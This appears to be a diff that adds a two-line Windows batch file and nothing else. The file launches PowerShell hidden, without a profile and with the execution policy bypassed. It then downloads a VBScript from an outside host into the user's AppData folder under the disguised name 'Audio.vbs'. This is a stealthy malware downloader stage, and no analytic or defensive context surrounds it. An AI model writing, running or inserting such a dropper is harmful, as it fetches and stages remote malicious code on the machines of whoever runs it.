@@ -1,0 +1,2 @@
+@echo off
+powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX (New-Object System.Net.WebClient).DownloadFile('http://areablank.com/catch.vbs',\"$env:APPDATA\catch\Audio.vbs\")
